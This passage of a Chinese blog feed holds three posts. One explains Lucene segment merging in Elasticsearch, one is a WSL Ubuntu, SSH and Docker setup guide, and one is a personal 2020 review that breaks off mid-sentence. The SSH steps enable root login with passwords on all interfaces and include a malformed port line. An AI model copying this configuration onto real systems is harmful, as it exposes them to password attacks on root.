并没有每新增一条数据就增加一个段，而是采用延迟写的策略，每当有新增的数据时，就将其先写入内存中，然后批量写入磁盘中。</p><p>若有一个段被写到硬盘，就会生成一个提交点，提交点就是一个用来记录所有提交后的段信息的文件。</p><p>一个段一旦拥有了提交点，就说明这个段只有读的权限，失去了写的权限；相反，当段在内存中时，就只有写数据的权限，而不具备读数据的权限，所以也就不能被检索了。</p><p>从严格意义上来说，Lucene 或者 Elasticsearch 并不能被称为实时的搜索引擎，只能被称为准实时的搜索引擎。</p><p>写索引的流程如下：</p><ul><li>新数据被写入时，并没有被直接写到硬盘中，而是被暂时写到内存中。Lucene 默认是一秒钟，或者当内存中数据量达到一定阶段时，再批量提交到磁盘中。</li><li>当然，默认的时间和数据量的大小是可以通过参数控制的。通过延时写的策略，可以减少数据往磁盘上写的次数，从而提升整体的写入性能，如图 3。</li><li>在达到出触发条件以后，会将内存中缓存的数据一次性写入磁盘中，并生成提交点。</li><li>清空内存，等待新的数据写入，如下图所示。</li></ul><p><img src="/images/big-data/es-01/18.jpg" alt="18"></p><p>从上述流程可以看出，数据先被暂时缓存在内存中，在达到一定的条件再被一次性写入硬盘中，这种做法可以大大提升数据写入的速度。</p><p>但是数据先被暂时存放在内存中，并没有真正持久化到磁盘中，所以如果这时出现断电等不可控的情况，就会丢失数据，为此，Elasticsearch 添加了事务日志，来保证数据的安全。</p><h4 id="段合并策略"><a href="#段合并策略" class="headerlink" title="段合并策略"></a>段合并策略</h4><p>虽然分段比每次都全量创建索引有更高的效率，但是由于在每次新增数据时都会新增一个段，所以经过长时间的的积累，会导致在索引中存在大量的段。</p><p>当索引中段的数量太多时，不仅会严重消耗服务器的资源，还会影响检索的性能。</p><p>因为索引检索的过程是：查询所有段中满足查询条件的数据，然后对每个段里查询的结果集进行合并，所以为了控制索引里段的数量，我们必须定期进行段合并操作。</p><p>但是如果每次合并全部的段，则会造成很大的资源浪费，特别是 “大段” 的合并。</p><p>所以 Lucene 现在的段合并思路是：根据段的大小将段进行分组，再将属于同一组的段进行合并。</p><p>但是由于对于超级大的段的合并需要消耗更多的资源，所以 Lucene 会在段的大小达到一定规模，或者段里面的数据量达到一定条数时，不会再进行合并。</p><p>所以 Lucene 的段合并主要集中在对中小段的合并上，这样既可以避免对大段进行合并时消耗过多的服务器资源，也可以很好地控制索引中段的数量。</p><p>段合并的主要参数如下：</p><ul><li>mergeFactor：每次合并时参与合并的最少数量，当同一组的段的数量达到此值时开始合并，如果小于此值则不合并，这样做可以减少段合并的频率，其默认值为 10。</li><li>SegmentSize：指段的实际大小，单位为字节。</li><li>minMergeSize：小于这个值的段会被分到一组，这样可以加速小片段的合并。</li><li>maxMergeSize：若有一段的文本数量大于此值，就不再参与合并，因为大段合并会消耗更多的资源。</li></ul><p>段合并相关的动作主要有以下两个：</p><ul><li>对索引中的段进行分组，把大小相近的段分到一组，主要由 LogMergePolicy1 类来处理。</li><li>将属于同一分组的段合并成一个更大的段。</li></ul><p>在段合并前对段的大小进行了标准化处理，通过 logMergeFactorSegmentSize 计算得出。</p><p>其中 MergeFactor 表示一次合并的段的数量，Lucene 默认该数量为 10；SegmentSize 表示段的实际大小。通过上面的公式计算后，段的大小更加紧凑，对后续的分组更加友好。</p><p>段分组的步骤如下</p><ol><li>根据段生成的时间对段进行排序，然后根据上述标准化公式计算每个段的大小并且存放到段信息中，后面用到的描述段大小的值都是标准化后的值，如图所示：</li></ol><p><img src="/images/big-data/es-01/19.jpg" alt="19"></p><ol start="2"><li><p>在数组中找到最大的段，然后生成一个由最大段的标准化值作为上限，减去 LEVEL_LOG_SPAN（默认值为 0.75）后的值作为下限的区间，小于等于上限并且大于下限的段，都被认为是属于同一组的段，可以合并。</p></li><li><p>在确定一个分组的上下限值后，就需要查找属于这个分组的段了，具体过程是：创建两个指针（在这里使用指针的概念是为了更好地理解）start 和 end。</p></li></ol><p>start 指向数组的第 1 个段，end 指向第 start+MergeFactor 个段，然后从 end 逐个向前查找落在区间的段。</p><p>当找到第 1 个满足条件的段时，则停止，并把当前段到 start 之间的段统一分到一个组，无论段的大小是否满足当前分组的条件。</p><p>如图所示，第 2 个段明显小于该分组的下限，但还是被分到了这一组。</p><p><img src="/images/big-data/es-01/20.jpg" alt="20"></p><p>这样做的好处如下：</p><ul><li>增加段合并的概率，避免由于段的大小参差不齐导致段难以合并。</li><li>简化了查找的逻辑，使代码的运行效率更高。</li></ul><ol start="4"><li>在分组找到后，需要排除不参加合并的 “超大” 段，然后判断剩余的段是否满足合并的条件。</li></ol><p>如上图所示，mergeFactor=5，而找到的满足合并条件的段的个数为 4，所以不满足合并的条件，暂时不进行合并，继续找寻下一个组的上下限。</p><ol start="5"><li>由于在第 4 步并没有找到满足段合并的段的数量，所以这一分组的段不满足合并的条件，继续进行下一分组段的查找。</li></ol><p>具体过程是：将 start 指向 end，在剩下的段（从 end 指向的元素开始到数组的最后一个元素）中寻找最大的段，在找到最大的值后再减去 LEVEL_LOG_SPAN 的值，再生成一下分组的区间值。</p><p>然后把 end 指向数组的第 start+MergeFactor 个段，逐个向前查找第 1 个满足条件的段：重复第 3 步和第 4 步。</p><ol start="6"><li>如果一直没有找到满足合并条件的段，则一直重复第 5 步，直到遍历完整个数组，如图所示：</li></ol><p><img src="/images/big-data/es-01/21.jpg" alt="21"></p><ol start="7"><li>在找到满足条件的 mergeFactor 个段时，就需要开始合并了。但是在满足合并条件的段大于 mergeFactor 时，就需要进行多次合并。</li></ol><p>也就是说每次依然选择 mergeFactor 个段进行合并，直到该分组的所有段合并完成，再进行下一分组的查找合并操作。</p><ol start="8"><li>通过上述几步，如果找到了满足合并要求的段，则将会进行段的合并操作。</li></ol><p>因为索引里面包含了正向信息和反向信息，所以段合并的操作分为两部分：</p><ul><li>一个是正向信息合并，例如存储域、词向量、标准化因子等。</li><li>一个是反向信息的合并，例如词典、倒排表等。</li></ul><p>在段合并时，除了需要对索引数据进行合并，还需要移除段中已经删除的数据。</p><h4 id="Lucene-相似度打分"><a href="#Lucene-相似度打分" class="headerlink" title="Lucene 相似度打分"></a>Lucene 相似度打分</h4><p>我们在前面了解到，Lucene 的查询过程是：首先在词典中查找每个 Term，根据 Term 获得每个 Term 所在的文档链表；然后根据查询条件对链表做交、并、差等操作，链表合并后的结果集就是我们要查找的数据。</p><p>这样做可以完全避免对关系型数据库进行全表扫描，可以大大提升查询效率。</p><p>但是，当我们一次查询出很多数据时，这些数据和我们的查询条件又有多大关系呢？其文本相似度是多少？</p><p>后面会回答这个问题，并介绍 Lucene 最经典的两个文本相似度算法：基于向量空间模型的算法和基于概率的算法（BM25）。</p><p>如果对此算法不太感兴趣，那么只需了解对文本相似度有影响的因子有哪些，哪些是正向的，哪些是逆向的即可，不需要理解每个算法的推理过程。但是这两个文本相似度算法有很好的借鉴意义。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.elastic.co/guide/cn/elasticsearch/guide/current/intro.html" target="_blank" rel="noopener">https://www.elastic.co/guide/cn/elasticsearch/guide/current/intro.html</a></li><li><a href="https://www.elastic.co/cn/what-is/elasticsearch" target="_blank" rel="noopener">https://www.elastic.co/cn/what-is/elasticsearch</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/docs-replication.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/current/docs-replication.html</a></li><li><a href="https://www.elastic.co/cn/downloads/elasticsearch" target="_blank" rel="noopener">https://www.elastic.co/cn/downloads/elasticsearch</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/settings.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/current/settings.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/important-settings.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/current/important-settings.html</a></li><li>《Elasticsearch核心技术与实战》</li><li><a href="https://elasticsearch.cn" target="_blank" rel="noopener">https://elasticsearch.cn</a></li><li><a href="https://www.elastic.co/cn/blog" target="_blank" rel="noopener">https://www.elastic.co/cn/blog</a></li><li><a href="https://lucene.apache.org" target="_blank" rel="noopener">https://lucene.apache.org</a></li><li><a href="https://lucene.apache.org/solr" target="_blank" rel="noopener">https://lucene.apache.org/solr</a></li></ul><style>  img {    zoom: 50%;  }</style>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Elasticsearch 是一个基于 Lucene 的搜索引擎。基于 Lucene ，超越 Lucene。它提供了一个分布式多用户能力的全文搜索引擎，基于 RESTful web 接口。Elasticsearch 是用 Java 开发的，并作为 Apache 许可条款下的开放源码发布，是当前流行的企业级搜索引擎。设计用于云计算中，能够达到近实时搜索，稳定，可靠，快速。&lt;/p&gt;
    
    </summary>
    
    
      <category term="BigData" scheme="https://xinlichao.cn/categories/BigData/"/>
    
    
      <category term="ES" scheme="https://xinlichao.cn/tags/ES/"/>
    
  </entry>
  
  <entry>
    <title>Windows10 安装 Ubuntu 子系统</title>
    <link href="https://xinlichao.cn/back-end/linux/wsl-ubuntu/"/>
    <id>https://xinlichao.cn/back-end/linux/wsl-ubuntu/</id>
    <published>2021-01-15T16:00:00.000Z</published>
    <updated>2021-02-26T10:23:44.682Z</updated>
    
    <content type="html"><![CDATA[<p>WSL 安装 Ubuntu</p><a id="more"></a><h2 id="启动-WSL"><a href="#启动-WSL" class="headerlink" title="启动 WSL"></a>启动 WSL</h2><ol><li>启动开发者模式:</li></ol><p>设置——&gt;更新和安全——&gt;开发者选项——&gt;开发人员模式</p><ol start="2"><li>打开windows下的Linux子系统</li></ol><p>控制面板——&gt;程序和功能——&gt;启用或关闭Windows功能——&gt;适用于Linux的Windows子系统——&gt;确定——&gt;重启(开机可能需要长时间，耐心等待即可）</p><ol start="3"><li>下载并安装Ubuntu</li></ol><p>在应用商店中搜索Ubuntu，选择Ubuntu 18.04 LTS长期支持版，点击获取进行下载及安装，安装完毕点击启动会打开bash命令行提示我们设置用户名（常用的不具有root权限的用户）和密码。这样我们就拥有了Ubuntu子系统。<br>子系统所在目录为：<code>C:\Users\【你的windows用户名】\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs</code></p><h2 id="Ubuntu-安装后的一些配置"><a href="#Ubuntu-安装后的一些配置" class="headerlink" title="Ubuntu 安装后的一些配置"></a>Ubuntu 安装后的一些配置</h2><h3 id="查看基本的信息"><a href="#查看基本的信息" class="headerlink" title="查看基本的信息"></a>查看基本的信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看linux内核版本</span></span><br><span class="line">uname -r</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看系统版本</span></span><br><span class="line">cat /etc/lsb-release</span><br><span class="line"></span><br><span class="line"><span class="comment"># Win10下其他硬盘分区会在Linux安装过程自动加载到Linux中，具体可进入/mnt中查看。</span></span><br><span class="line">df -h</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 windows 中打开当前文件夹</span></span><br><span class="line">explorer.exe .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 root 权限登录，后续输入密码</span></span><br><span class="line">sudo -i</span><br></pre></td></tr></table></figure><h3 id="修改软件源"><a href="#修改软件源" class="headerlink" title="修改软件源"></a>修改软件源</h3><p>Ubuntu 软件源的源列表文件位于 <code>/etc/apt/sources.list</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份原来的数据源配置文件：</span></span><br><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list_backup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改数据源配置文件：</span></span><br><span class="line">sudo vim /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更改为阿里镜像源：</span></span><br><span class="line"><span class="comment"># 用 vim 编辑/etc/apt/sources.list 文件，可以用下面命令快捷的修改字符：</span></span><br><span class="line">:%s/http:\/\/archive.ubuntu.com/https:\/\/mirrors.aliyun.com/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新软件源</span></span><br><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新软件包</span></span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure><h3 id="启用SSH所需设置"><a href="#启用SSH所需设置" class="headerlink" title="启用SSH所需设置"></a>启用SSH所需设置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置root的口令（密码），用作后续登陆使用</span></span><br><span class="line">sudo passwd root</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装openssh-server（似乎ubuntu自带已安装）</span></span><br><span class="line">sudo apt install openssh-server</span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份很重要</span></span><br><span class="line">sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用vim进行编辑，按i进入insert模式</span></span><br><span class="line">sudo vim /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line">service ssh start             <span class="comment">#启动SSH服务</span></span><br><span class="line">service ssh status            <span class="comment">#检查状态</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在vim中分别找到并对应修改四处，修改后ESC，输入wq保存退出，具体如下：</span></span><br><span class="line">Port = 8022</span><br><span class="line">ListenAddress 0.0.0.0        <span class="comment"># 如果需要指定监听的IP则去除最左侧的井号，并配置对应IP，默认即监听PC所有IP</span></span><br><span class="line">PermitRootLogin yes           <span class="comment"># 如果你需要用 root 直接登录系统则此处改为 yes</span></span><br><span class="line">PasswordAuthentication yes    <span class="comment"># 将 no 改为 yes 表示使用帐号密码方式登录</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动SSH并检查状态，输出running即正确。</span></span><br><span class="line">sudo service ssh start             <span class="comment"># 启动SSH服务</span></span><br><span class="line">sudo service ssh status            <span class="comment"># 检查状态</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> ssh          <span class="comment"># 开机自动启动ssh命令</span></span><br></pre></td></tr></table></figure><h3 id="配置Ubuntu子系统图形桌面"><a href="#配置Ubuntu子系统图形桌面" class="headerlink" title="配置Ubuntu子系统图形桌面"></a>配置Ubuntu子系统图形桌面</h3><p>安装WSL之后，Linux是没有形界面的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 xrdp、xfce4</span></span><br><span class="line">sudo apt install xorg</span><br><span class="line"></span><br><span class="line">sudo apt-get install xfce4</span><br><span class="line"></span><br><span class="line">sudo apt-get install xrdp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 说明，xrdp是一个轻量级ubuntu桌面，里面的应用只能满足基本需求，但够用了。</span></span><br></pre></td></tr></table></figure><p>配置xrdp </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置使用3390端口，</span></span><br><span class="line">sudo sed -i <span class="string">'s/port=3389/port=3390/g'</span> /etc/xrdp/xrdp.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向xsession中写入xfce4-session</span></span><br><span class="line">sudo <span class="built_in">echo</span> xfce4-session &gt;~/.xsession</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启xrdp服务：</span></span><br><span class="line">sudo service xrdp restart</span><br></pre></td></tr></table></figure><p>连接远程桌面</p><p>在windows10，启动远程桌面连接(运行命令：<code>mstsc</code>。点击显示选项，填入本机IP（本地IP默认是127.0.0.1），输入登录用户，点击连接。输入密码，确定即可连接。</p><blockquote><p>注意，如果WSL的Ubuntu系统关闭，如关机重启，会导致远程连接不上，此时需要先在Win10中打开Ubuntu的命令行界面，输入：<code>sudo service xrdp restart</code> 此时再远程连接，即可连接上。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装常用软件</span></span><br><span class="line"></span><br><span class="line">sudo apt install make g++</span><br><span class="line"></span><br><span class="line">sudo apt install perl-doc</span><br><span class="line"></span><br><span class="line">sudo apt install tree</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 清理无用的软件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清理旧版本的软件缓存</span></span><br><span class="line">sudo apt-get autoclean</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清理所有软件缓存</span></span><br><span class="line">sudo apt-get clean</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除系统不再使用的孤立软件</span></span><br><span class="line">sudo apt-get autoremove</span><br></pre></td></tr></table></figure><h3 id="解决WSL的中文乱码问题"><a href="#解决WSL的中文乱码问题" class="headerlink" title="解决WSL的中文乱码问题"></a>解决WSL的中文乱码问题</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先安装以下软件包：</span></span><br><span class="line">sudo apt-get install language-pack-zh-hans</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开以下文件</span></span><br><span class="line">sudo vim /etc/environment</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在最后写入以下内容，保存</span></span><br><span class="line">LANG=<span class="string">"zh_CN.UTF-8"</span></span><br><span class="line">LANGUAGE=<span class="string">"zh_CN:zh:en_US:en"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在/var/lib/locales/supported.d/，新建local文件</span></span><br><span class="line">sudo vim /var/lib/locales/supported.d/<span class="built_in">local</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入以下，并保存：</span></span><br><span class="line">en_US.UTF-8 UTF-8</span><br><span class="line">zh_CN.UTF-8 UTF-8</span><br><span class="line">zh_CN.GBK GBK</span><br><span class="line">zh_CN GB2312</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行以下命令, 关闭WSL界面再开启即可，不用关机</span></span><br><span class="line">sudo locale-gen</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解决中文空格乱码问题</span></span><br><span class="line">sudo apt-get install fonts-droid-fallback ttf-wqy-zenhei ttf-wqy-microhei fonts-arphic-ukai fonts-arphic-uming</span><br></pre></td></tr></table></figure><h2 id="Docker-配置与安装"><a href="#Docker-配置与安装" class="headerlink" title="Docker 配置与安装"></a>Docker 配置与安装</h2><p>先卸载旧版本的docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker.io</span><br></pre></td></tr></table></figure><p>安装必要的一些系统工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install \</span><br><span class="line">      apt-transport-https \</span><br><span class="line">      ca-certificates \</span><br><span class="line">      curl \</span><br><span class="line">      software-properties-common</span><br></pre></td></tr></table></figure><p>安装GPG证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 别忘了最后的“-”</span></span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>写入软件源信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository <span class="string">"deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu <span class="variable">$(lsb_release -cs)</span> stable"</span></span><br></pre></td></tr></table></figure><p>列出可用版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-cache madison docker-ce</span><br></pre></td></tr></table></figure><p>更新并安装 Docker-CE</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-ce=18.06.3~ce-0~ubuntu-xenial</span><br></pre></td></tr></table></figure><p>开启docker服务，查看docker状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker start</span><br><span class="line">sudo service docker status</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">sudo systemctl status docker</span><br><span class="line">sudo systemctl start docker</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure><p>加载阿里云加速器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker </span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-<span class="string">'EOF'</span></span><br><span class="line">&#123; </span><br><span class="line"><span class="string">"registry-mirrors"</span>: [<span class="string">"https://你自己的加速地址.mirror.aliyuncs.com"</span>]</span><br><span class="line">&#125; </span><br><span class="line">EOF </span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">wslconfig 在适用于 Linux 的 Windows 子系统上执行管理操作</span><br><span class="line"></span><br><span class="line">用法:</span><br><span class="line">    /l, /list [Option]</span><br><span class="line">        列出已注册的分发。</span><br><span class="line">        /all - 可选择列出所有分发，包括当前正在</span><br><span class="line">               安装或卸载的分发。</span><br><span class="line"></span><br><span class="line">        /running - 只列出当前正在运行的分发。</span><br><span class="line"></span><br><span class="line">    /s, /setdefault &lt;DistributionName&gt;</span><br><span class="line">        将分发设置为默认值。</span><br><span class="line"></span><br><span class="line">    /t, /terminate &lt;DistributionName&gt;</span><br><span class="line">        终止分发。</span><br><span class="line"></span><br><span class="line">    /u, /unregister &lt;DistributionName&gt;</span><br><span class="line">        注销分发。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">当我们运行WSL时，它会用第一次运行时输入的用户名登陆，如果想改为其他用户，可以（以ubuntu为例）：</span><br><span class="line">ubuntu config --default-user root</span><br><span class="line"></span><br><span class="line">这样，以后再运行ubuntu它就会默认以root登陆。此外还可以“ubuntu /?”查看其更多使用方法。</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://docs.microsoft.com/zh-cn/windows/wsl/install-win10" target="_blank" rel="noopener">适用于 Linux 的 Windows 子系统安装指南 (Windows 10)</a></li><li><a href="https://docs.microsoft.com/zh-cn/windows/wsl/install-manual" target="_blank" rel="noopener">手动下载适用于 Linux 的 Windows 子系统发行版包</a></li><li><a href="https://zhuanlan.zhihu.com/p/61542198/" target="_blank" rel="noopener">【WSL+Docker】新手Win10下的WSL Ubuntu18并使用Docker（两种方式）</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;WSL 安装 Ubuntu&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://xinlichao.cn/categories/Linux/"/>
    
    
      <category term="WSL" scheme="https://xinlichao.cn/tags/WSL/"/>
    
      <category term="Ubuntu" scheme="https://xinlichao.cn/tags/Ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>2020年总结</title>
    <link href="https://xinlichao.cn/life/2020-summary/"/>
    <id>https://xinlichao.cn/life/2020-summary/</id>
    <published>2021-01-01T13:14:00.000Z</published>
    <updated>2021-02-26T10:23:44.686Z</updated>
    
    <content type="html"><![CDATA[<p>2020年，活着就好！</p><a id="more"></a><p>“2020年 不总结了，就当没来过！”刚刚在微信群里感慨道，好像从来没有像今年这样，盼着一年快点过完。2020年，发生了太多大事：全球疫情、巨星陨落、澳洲大火、奥运会取消……</p><p>疫情，年初“新冠肺炎疫情”突如其来，注定让2020年变得与众不同。在我的记忆中也经历过疫情“非典”，那时还在上小学，不太记得当时做了什么。这次的疫情怕是终身难忘，春节期间8天没下过楼，在家打游戏，看直播好不快哉。</p><p>假期结束，回到公寓准备上班的时候，接到公司通知继续放假且需要隔离14天，这时我才意识到疫情可能只是开始。饭店没有开门、没有外卖、没有口罩，你知道我这14天是怎么过的吗……还好我有屯零食的习惯……</p><p>熔断，三月美股先后熔断五次，创下了历史记录。“巴菲特活了89年才见到的场面，我半个月就见到了五次，是不是很厉害！”成了韭菜圈的自我安慰的一句话。是危也是机，上半年亏的钱，没想到下半年就赚回来了，我的操作就是没操作（跌的时候硬抗）。我接触理财三年，炒股两年，其实炒股并没有赚到什么钱，反而是基金小赚了一点，最近我也在反思，炒股费时间精力，可能基金更适合我。</p><p>第一次户外，五月国内疫情控制的很好，半年没有出去跟朋友哈啤酒了，月底我们三五好友去海边野炊，炊的不怎么样，但见到海的那一刻心情愉悦，所有烦恼都烟消云散。</p><p>第一次聚餐，八月一朋友出差回来，我们7个人每年都会聚几次，今年是第一次聚餐，吃的烤鱼(记得上次也吃的烤鱼)，排了很久的队，能感觉出来大家都憋坏了，吃的酣畅淋漓，我觉得要是吃火锅可能会更嗨哈哈哈。</p><p>第一场电影，九月电影院终于解封，我不明白为什么澡堂子早早就解封了电影院却才解封，这是什么逻辑[懵]。今年第一场去影院看的电影也是唯一一场电影，诺兰的《信条》。这部电影怎么讲呢……看诺兰的电影烧脑就对了。</p><p>宅在家中，十月国内疫情已经没有了，但国外就比较惨了，每天新增疫情人数高达六位数，中国成了最安全的国家[骄傲]。十一长假朋友都在计划着国内旅游，我也有完整的计划，买了很多零食，睡觉、吃饭、打游戏、看书、刷高分电影，安排的满满的。特别爱看《行尸走肉》，今年看这部剧有不一样的感觉，这种感觉你懂吧？无法用言语表达。我很喜欢宅在家中做自己想做的事情，并不感觉孤独且很享受，我感觉能宅在家中三个月不出门，而且就快实现了。</p><p>离职，十一假期结束回来后我就提了离职，成功加入2020年失业大军的一员，其实离职这个想法有了很久，现在的公司并不适合我，也有点冲动了……离职前的计划是出去旅游，完成去年的旅游计划，为了不给国家添麻烦还是决定不去了（主要是钱包瘦了）。在第五次（去年面试也第五次）面试的时候顺利拿到了offer，薪资待遇还算满意，当天我参加了一个会议后，决定不入职这家公司了，公司不适合我，可能我根本没想明白要找一个什么样的工作，也决定